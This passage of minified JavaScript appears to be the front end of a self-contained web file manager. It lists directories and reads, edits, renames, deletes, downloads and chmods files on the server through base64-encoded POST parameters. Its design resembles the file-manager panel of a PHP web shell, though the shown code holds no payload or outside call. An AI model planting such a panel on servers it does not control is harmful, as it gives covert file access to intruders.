YwOkIq2gMaNCeNVd1tuKs7BFOV8NrFJH7wm1m0BTU8tXU5glrVurqmE/aZsHHwDyZOn25QB+oBqBSmBRGhBx7DL6ZzuBzPYDZnw/JUBDQJMUNBJpWAFAgjnXeRtDjmMpY4W66EnoiGTy2P4NMromgx/balsgvi02Zh1d5IETh9+rcXskgksuHvn/qb18ZGhiMLi5cvC0UAIjeqJ2HgDhetBVXlgguYChPb79FYrFyZS9zXadOsHj0XjVsNAhgc3PTT119/fQiAxRijdquiuJ7nKb29vRu2b9v66gMbNog9FV8cyssl33yxD1rW8ppaU1mPlDSeWu9iy11lXMURNIFUWh+Lkl+pA0zsxPqB8evNCy+88POXXnppp67rdn9/f4Ex5pUN8DxPfeWVV4zHHntsg2EYqiRJsq7rCmOMPiQR4rvrurLruorneeLsOI5iWZbMOZdt21Zs25bpXqFQoDO9wyRJ8hRF4bquc0VRHFVVuaqqjizLXNM0h55JkuQwxhxJksR3OnPOHc/zuOd5Dh2dnZ2TL7744mVFUawVK1bkayJAF2TU5OSkNjMzo3POyVhlbm5OLRQK4pzL5ZR8Pq9kMhk6q/Q9nU7TdzmbzQqjs9ksASHDJcdxyg5SFMUjo0zTdDVNE2ACgYBjGAbds4PBIDcMg850zwmHw3Y4HHZ0XXdaWlpsAhUKhQpr1qzJM8bs+rW6eNfzPHbu3DlVlmU9m80aZCQZT0DIWAKQyWRkuibPZ7NZcpecy+Ukigb9njxPn9JeJ0WBPhR2AkBAKAKBQECcyVDTNMlwEZ1AIMDJcFVV87FYLN/f31/mfXV1rtd217SwxchIb7/9tpxKpWRVVdV0Oq3quq6lUimNaMM5l8j4ktc552Q4k2W5PD7nnGjkybIszpIkuQSCjJUkyaIPRYCMBmDfc889LmOMLzJmwY2mADQapAhSyNSpU6dYR0cHC4fDzDRNMX4ul/NSqZQXj8dFYj788MNkXDP/YWg49f8agIYz/R+98P8ewP8AimsFmmmOKV0AAAAASUVORK5CYII=",
            ini_icon = "data:image/png;base64,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",
            sh_icon = "data:image/png;base64,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";

        function list_dir(e) {
            void 0 === e && (e = ".");
            let t = document.querySelector(".inner table"),
                A = document.querySelector(".inner .loaderhold .loader");
            t.style.display = "none", A.style.display = "block";
            let n = new FormData;
            n.append("list_dir", btoa(e));
            let i = new XMLHttpRequest;
            i.open("post", basename(), !0), i.onload = function() {
                if (4 == i.readyState) {
                    var e = JSON.parse(this.response);
                    if (void 0 !== e.status || null == e.name || null == e.name || "" == e.name) show_popup("Can not change dir!", 3e3, "alert"), A.style.display = "none", t.style.display = "table", document.getElementById("curr_dir").value = working_dir;
                    else {
                        let n = document.querySelector(".inner table tbody"),
                            i = n.querySelectorAll("tr");
                        for (let e = 0; e < i.length; e++) i[e].parentNode.removeChild(i[e]);
                        for (let t = 0; t < e.name.length; t++) {
                            let A = n.insertRow();
                            A.setAttribute("id", "tr_" + t);
                            let i = A.insertCell(),
                                o = A.insertCell(),
                                s = A.insertCell(),
                                l = A.insertCell(),
                                a = A.insertCell(),
                                r = A.insertCell();
                            if (i.style.textAlign = "center", o.style.textAlign = "left", "directory" == e.type[t]) ".." != e.name[t] ? (i.insertAdjacentHTML("afterbegin", '<i class="fas fa-folder" style="color:#d6b172;"></i>'), r.insertAdjacentHTML("afterbegin", '<div class="icons"><i onclick="download_folder_process(\'' + e.path[t].replace(/\\/g, "/") + '\');" class="fas fa-file-archive" style="color:#CB3637" title="Download as zip"></i><i class="fas fa-edit" style="color:#ffcf41" title="Rename" onclick="rename_dir(\'' + e.path[t].replace(/\\/g, "/") + "','" + A.getAttribute("id") + "','" + e.name[t] + '\');" style="color:#fff;"></i><i class="fas fa-trash-alt" title="Remove" onclick="remove_file(\'' + e.path[t].replace(/\\/g, "/") + "','" + A.getAttribute("id") + '\');" style="color:#f55858;"></i></div>'), o.insertAdjacentHTML("afterbegin", "<span onclick=\"list_dir('" + e.path[t].replace(/\\/g, "/") + "');\">" + e.name[t] + "</span>")) : (i.insertAdjacentHTML("afterbegin", '<i class="fas fa-folder" style="color:#d6b172;"></i>'), r.insertAdjacentHTML("afterbegin", ""), o.insertAdjacentHTML("afterbegin", "<span onclick=\"list_dir('" + e.path[t].replace(/\\/g, "/") + '\');"><i class="fas fa-arrow-left"></i></span>'));
                            else {
                                let n = e.name[t].substring(e.name[t].lastIndexOf(".") + 1).toLowerCase();
                                "js" == n ? i.insertAdjacentHTML("afterbegin", '<i class="fab fa-js" style="color:orange"></i>') : "sql" == n || "db" == n ? i.insertAdjacentHTML("afterbegin", '<i class="fas fa-database"></i>') : "php" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + php_icon + '" />') : "py" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + python_icon + '" />') : "rb" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + ruby_icon + '" />') : "c" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + c_icon + '" />') : "cpp" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + cpp_icon + '" />') : "sh" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + sh_icon + '" />') : "pl" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + perl_icon + '" />') : "config" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + config_icon + '" />') : "ini" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + ini_icon + '" />') : "json" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + json_icon + '" />') : "xml" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + xml_icon + '" />') : "txt" == n ? i.insertAdjacentHTML("afterbegin", '<i class="fas fa-file-alt"></i>') : "zip" == n || "rar" == n || "7z" == n || "tar" == n || "tar.gz" == n || "gz" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + zip_icon + '" />') : "css" == n ? i.insertAdjacentHTML("afterbegin", '<i class="fab fa-css3-alt" style="color:#3D58E7"></i>') : "jpg" == n || "gif" == n || "png" == n || "jpeg" == n || "bmp" == n || "webp" == n || "svg" == n || "ico" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + image_icon + '" />') : "html" == n || "htm" == n || "shtml" == n ? i.insertAdjacentHTML("afterbegin", '<i class="fab fa-html5" style="color:#EA682D"></i>') : "java" == n || "jar" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + java_icon + '" />') : "pdf" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + pdf_icon + '" />') : "doc" == n || "docx" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + word_icon + '" />') : "m4a" == n || "flac" == n || "mp3" == n || "wav" == n || "aac" == n || "wma" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + audio_icon + '" />') : "csv" == n || "xls" == n || "xlsx" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + excel_icon + '" />') : "potx" == n || "ppsx" == n || "pptx" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + powerpoint_icon + '" />') : "mp4" == n || "avi" == n || "mov" == n || "wmv" == n || "flv" == n || "avchd" == n || "mkv" == n || "3gp" == n ? i.insertAdjacentHTML("afterbegin", '<img style="width:17px;height:17px;" src="' + video_icon + '" />') : i.insertAdjacentHTML("afterbegin", '<i class="fas fa-file"></i>'), r.insertAdjacentHTML("afterbegin", '<div class="icons"><i class="fas fa-edit" style="color:#ffcf41" title="Edit" onclick="edit_file(\'' + e.path[t].replace(/\\/g, "/") + "','" + A.getAttribute("id") + '\');" style="color:#fff;"></i><i class="fas fa-trash-alt" title="Remove" onclick="remove_file(\'' + e.path[t].replace(/\\/g, "/") + "','" + A.getAttribute("id") + '\');" style="color:#f55858;"></i><i class="fas fa-file-download" title="Download" onclick="download_file(\'' + e.path[t].replace(/\\/g, "/") + '\');" style="color:#fff"></i></div>'), o.insertAdjacentHTML("afterbegin", '<span class="toggle" onclick="edit_file(\'' + e.path[t].replace(/\\/g, "/") + "','" + A.getAttribute("id") + "');\">" + e.name[t] + "</span>")
                            }
                            s.innerText = e.size[t], l.innerText = e.modify[t], a.insertAdjacentHTML("afterbegin", '<span class="toggle" onclick="set_chmod(\'' + e.path[t].replace(/\\/g, "/") + "','" + e.perm_num[t] + "');\">" + e.perms[t] + "</span>")
                        }
                        A.style.display = "none", t.style.display = "table", document.getElementById("curr_dir").value = e.current_dir, document.getElementById("read_file").value = e.current_dir, working_dir = e.current_dir;
                        let o = separate_path(),
                            s = "";
                        for (let e = 0; e < o[0].length; e++) {
                            let t = o[1][e];
                            "/" == o[0][e] ? s += "<strong style='cursor:pointer;font-size:16px;' onclick='list_dir(\"" + t + "\")'>" + o[0][e] + "</strong>" : s += "<strong style='cursor:pointer;font-size:16px;' onclick='list_dir(\"" + t + "\")'>" + o[0][e] + "/</strong>"
                        }
                        document.getElementById("path").innerHTML = s
                    }
                }
            }, i.send(n)
        }

        function remove_file(e, t) {
            if (window.confirm("Do you really want to remove this item?")) {
                let A = document.getElementById(t),
                    n = new FormData;
                n.append("remove_file", btoa(e));
                let i = new XMLHttpRequest;
                i.open("post", basename(), !0), i.onload = function() {
                    if (4 == i.readyState) {
                        if ("removed" != JSON.parse(this.response).status) return show_popup("This file/folder cannot be removed,check permissions!", 3e3, "alert"), !1;
                        A.parentNode.removeChild(A), show_popup("Removed successfully!", 2500, "success")
                    }
                }, i.send(n)
            }
        }

        function edit_file(e, t) {
            empty_process_screen();
            let A = document.querySelector(".process-screen"),
                n = document.createElement("h3");
            n.innerHTML = "Edit file " + e;
            let i = document.createElement("img");
            i.style.display = "none", i.style.width = "250px", i.style.height = "250px";
            let o = document.createElement("audio");
            o.controls = !0, o.style.display = "none", o.style.marginTop = "10px";
            let s = document.createElement("video");
            s.controls = !0, s.width = 350, s.height = 350, s.style.display = "none", s.style.marginTop = "10px";
            let l = document.createElement("form");
            l.setAttribute("id", "editfile"), l.setAttribute("onsubmit", "event.preventDefault();");
            let a = document.createElement("input");
            a.value = e, a.type = "text";
            let r = document.createElement("textarea");
            r.value = "Loading...", r.disabled = !0;
            let c = document.createElement("button");
            c.innerHTML = "EDIT";
            let d = new FormData;
            d.append("read_file", btoa(e));
            let p = new XMLHttpRequest;
            p.open("post", basename(), !0), p.onload = function() {
                if (4 == p.readyState) try {
                    let n = JSON.parse(this.response);
                    if (void 0 !== n.data_url) r.parentNode.removeChild(r), i.src = n.data_url, i.style.display = "block", c.setAttribute("onclick", 'edit_file_process("' + e + '","' + t + '","nosave");');
                    else if (n.audio) {
                        r.parentNode.removeChild(r);
                        let e = document.createElement("source");
                        e.src = basename() + "?play_audio=" + n.audio, o.appendChild(e), o.style.display = "block"
                    } else if (n.video) {
                        r.parentNode.removeChild(r);
                        let e = document.createElement("source");
                        e.src = basename() + "?play_video=" + n.video, s.appendChild(e), s.style.display = "block"
                    } else c.setAttribute("onclick", 'edit_file_process("' + e + '","' + t + '","save");'), null != n.content ? r.value = atob(n.content) : (show_popup("Can not read this file!", 3e3, "alert"), A.style.visibility = "hidden", A.style.opacity = "0", A.style.top = "-50%");
                    r.disabled = !1
                } catch (e) {
                    console.log(e)
                }
            }, p.send(d), l.appendChild(a), l.appendChild(o), l.appendChild(s), l.appendChild(i), l.appendChild(r), l.appendChild(c), A.appendChild(n), A.appendChild(l), A.style.visibility = "visible", A.style.opacity = "1", A.style.top = "50%"
        }

        function edit_file_process(e, t, A) {
            let n = new FormData,
                i = document.getElementById("editfile"),
                o = i.querySelector("button");
            if ("nosave" !== A) {
                let e = i.querySelector("textarea").value;
                n.append("content", btoa(e))
            }
            let s = i.querySelector("input").value;
            n.append("edit_file", btoa(e)), s !== e && n.append("rename", btoa(s)), o.disabled = !0, o.innerHTML = "EDITING...";
            let l = new XMLHttpRequest;
            l.open("post", basename(), !0), l.onload = function() {
                if (4 == l.readyState) {
                    try {
                        let n = JSON.parse(this.response);
                        if ("failed" == n.status) show_popup("Can not edit this file!", 3e3, "alert");
                        else if ("ok" == n.status) show_popup("File has edited successfully!", 3e3, "success");
                        else if (show_popup("File has edited successfully!", 3e3, "success"), null !== t || "" !== t) {
                            let i, o = document.getElementById(t).getElementsByTagName("td"),
                                s = document.getElementById("screen");
                            "nosave" !== A && (i = s.querySelector("textarea").value), s.querySelector("button").disabled = !1, s.querySelector("button").innerHTML = "EDIT", s.innerHTML = s.innerHTML.replace(new RegExp(escapeRegExp(n.old_name), "g"), n.status), s.querySelector("input").value = e.replace(new RegExp(escapeRegExp(n.old_name), "g"), n.status), "nosave" !== A && (s.querySelector("textarea").value = i);
                            for (let e = 0; e < o.length; e++) o[e].innerHTML = o[e].innerHTML.replace(new RegExp(escapeRegExp(n.old_name), "g"), n.status)
                        }
                    } catch (e) {
                        console.log(e)
                    }
                    o.disabled = !1, o.innerHTML = "EDIT"
                }
            }, l.send(n)
        }

        function readfile() {
            edit_file(document.getElementById("read_file").value, "")
        }

        function download_file(e) {
            window.location = basename() + "?download_file=" + btoa(e)
        }

        function rename_dir(e, t, A) {
            empty_process_screen();
            let n = document.querySelector(".process-screen"),
                i = document.createElement("h3");
            i.innerHTML = "Rename directory " + e;
            let o = document.createElement("form");
